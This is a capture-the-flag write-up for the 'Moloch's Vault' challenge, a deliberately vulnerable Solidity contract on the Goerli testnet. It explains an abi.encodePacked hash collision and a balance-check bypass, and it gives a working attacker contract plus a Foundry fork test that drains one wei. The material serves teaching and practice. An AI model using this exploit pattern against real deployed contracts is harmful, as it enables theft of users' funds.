# QuillCTF : Moloch’s Vault

## Objective of CTF

Steal at least 1 WEI from MolochVault.

Goerli link : https://goerli.etherscan.io/address/0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f

### Contract code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
/*
Title: MolochVault
Author: @Kodak_Rome
Inspiration from: https://molochdao.com/
*/

contract MOLOCH_VAULT {
    bytes32 immutable Moloch; receive() external payable {}
    bytes32 immutable hy7UIH;
    bytes32 private immutable hsah;
    mapping(address => bool) public realHacker;

    struct Cabal {
        address payable identity;
        string password;
    }
    string[2] public question;
    Cabal[] private cabals;
    
    
    function initiation(address payable _id, string memory _passW) public returns(bool){
        Cabal[] memory updatedCabal = cabals;
        uint lengthBefore = updatedCabal.length;
        Cabal memory newCabal = Cabal({password: _passW,
                                 identity: _id});
        realCabals.push(newCabal);
        uint lengthAfter = realCabals.length;
        bool initiated = true;
        require(lengthAfter  >= lengthBefore,"None added");
        require(initiated, "Status declined");
        return initiated;
    }
    Cabal[] public realCabals;

    function sendGrant(address payable _grantee) public payable {
        require(Moloch == keccak256(abi.encodePacked(msg.sender)) || realHacker[msg.sender], "Far $rm success!!");
        (bool success,) = _grantee.call{value: 1 wei}("");
        require(success);
    }

    bool savage;
    

    function uhER778(string[3] memory _openSecrete) public payable {
        uint RGDTjhU = address(this).balance;
        require(hsah == keccak256(abi.encode(_openSecrete[0])) && msg.value < 3 gwei, "success"); 
        require(hy7UIH == keccak256(abi.encodePacked(_openSecrete[1],_openSecrete[2])), "Hahahaha!!");
        require(keccak256(abi.encode(_openSecrete[1])) != keccak256(abi.encode(question[0])),"grant awarded!!");
        (bool success,) = payable(msg.sender).call{value: 1 wei}("");
        require(success);
        uint YHUiiFD = address(this).balance;
        require(YHUiiFD - RGDTjhU == 1, "sacrifice your shallow desires" );
        realHacker[msg.sender] = true;
    }


    constructor( string memory molochPass,string[2] memory _b, address payable[3] memory a, string[3] memory _passss)payable {
        /*
        Intelligence. Perhaps Irrelevant;
        All value in string _passss were moloch-encrypted before input as added sec.
        string molochPass is Moloch-hash-algorithm preimage to 3rd value passed in string[3] _passss.
        Moloch-encryption algorithm was used to tweet
        "THE FUTURE OF HUMANITY REQUIRES THE SACRIFICE YOUR SHALLOW DESIRES" 
        On 11/02/2023 via @Kodak_Rome
        Link: "https://twitter.com/Kodak_Rome/status/1624372583310262279"
        */  

        Moloch = keccak256(abi.encodePacked(msg.sender));
        hsah = keccak256(abi.encode(molochPass)); 
        question[0] = _b[0]; question[1] = _b[1];
        hy7UIH = keccak256(abi.encodePacked(question[0],question[1]));

        for(uint256 i = 0; i < a.length; i++) {
    
            Cabal memory aMember = Cabal({password: _passss[i],
                                 identity: a[i]});
            cabals.push(aMember);
        }
    }
}
```

The `uhER778()` function will send us 1 wei, however it checks that `YHUiiFD - RGDTjhU == 1` at the end, `YHUiiFD` will be the current balance and `RGDTjhU` is the balance when the function call just started, so it means after it send us 1 wei, the newer balance should have 1 wei more than the old balance, we can achieve this by sending 2 wei back to the contract on the fallback function

After that, it will set `realHacker` mapping of us to true, then we can use `sendGrant()` to actually steal wei from the contract

`uhER778()` takes a string array of 3 elements `_openSecrete`, first it will check that `hsah` is the kecak256 of `_openSecrete[0]`, which `hsah` is assigned in the constructor, it is the keccak256 of `molochPass`

Then it checks `hy7UIH` is the keccak256 hash of `abi.encodePacked(_openSecrete[1],_openSecrete[2])`, `hy7UIH` is also assigned in the constructor, which is the keccak256 of `abi.encodePacked(question[0],question[1])`, so `_openSecrete[1]` and `_openSecrete[2]` should be `question[0]` and `question[1]` respectively?

However it checks that `_openSecrete[1]` can not be equal to `question[0]`, but it's using `abi.encodePacked()` and string is having dynamic length, so we can move some characters from `question[0]` to `question[1]` and the `abi.encodePacked()` result will be the same, as it will pack the encoded data without having 0 padding like `abi.encode()`

So we have to decode the constructor argument, we can get that in goerli etherscan : https://goerli.etherscan.io/address/0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f#code

```
00000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db00000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000011424c4f4f445920504841524d414349535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000a57484f20444f20594f5500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653455256453f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000054b434c45510000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009424754474a514e4750000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000115a4a515142572a4e4643504b43414b5152000000000000000000000000000000
```

We can use cast to decode this, first make a function signature that takes the same parameter, then append that function signature to the constructor arguments

```
# cast sig "test(string memory,string[2] memory,address[3] memory,string[3] memory)"
0x5333b498

# cast --calldata-decode "test(string memory,string[2] memory,address[3] memory,string[3] memory)" 0x5333b49800000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db00000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000011424c4f4f445920504841524d414349535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000a57484f20444f20594f5500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653455256453f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000054b434c45510000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009424754474a514e4750000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000115a4a515142572a4e4643504b43414b5152000000000000000000000000000000
BLOODY PHARMACIST
[WHO DO YOU, SERVE?]
[0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db]
[KCLEQ, BGTGJQNGP, ZJQQBW*NFCPKCAKQR]
```

### Attacker contract

```soldity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./MolochVault.sol";

contract MolochVaultExploit {
    bool sendEth = true;
    
    function exploit(address molochVault) public payable {
        require(msg.value == 3 wei, "invalid msg.value");
        MOLOCH_VAULT(payable(molochVault)).uhER778(["BLOODY PHARMACIST", "WHO DO YOUSERVE", "?"]);
        sendEth = false;
        MOLOCH_VAULT(payable(molochVault)).sendGrant(payable(address(this)));
        MOLOCH_VAULT(payable(molochVault)).sendGrant(payable(address(this)));
    }
    
    receive() external payable {
        if (sendEth) {
            payable(msg.sender).transfer(2 wei);
        }
    }
}
```

## Proof of concept

we can use foundry to test this by forking the goerli network

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/MolochVault.sol";
import "../src/MolochVaultExploit.sol";

contract Hack is Test {
    MOLOCH_VAULT molochVault;
    MolochVaultExploit molochVaultExploit;
    uint256 startBalance;
    address hacker = vm.addr(2);

    function setUp() external {
        molochVault = MOLOCH_VAULT(payable(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f));
        startBalance = address(molochVault).balance;
        console.log("Starting balance : ", startBalance);
        
        vm.prank(hacker);
        molochVaultExploit = new MolochVaultExploit();
        vm.deal(hacker, 1 ether);
    }

    function test() public {
        vm.startPrank(hacker);
        molochVaultExploit.exploit{value: 3 wei}(address(molochVault));
        console.log("Balance after exploit : ", address(molochVault).balance);

        assertLt(address(molochVault).balance, startBalance);
    }
}
```

### Foundry test output

```
# forge test --match-path test/MolochVault.t.sol -vv --fork-url https://goerli.infura.io/v3/REDACTED
[⠒] Compiling...
No files changed, compilation skipped

Running 1 test for test/MolochVault.t.sol:Hack
[PASS] test() (gas: 92034)
Logs:
  Starting balance :  9999999999999945
  Balance after exploit :  9999999999999944

Test result: ok. 1 passed; 0 failed; finished in 3.11s
```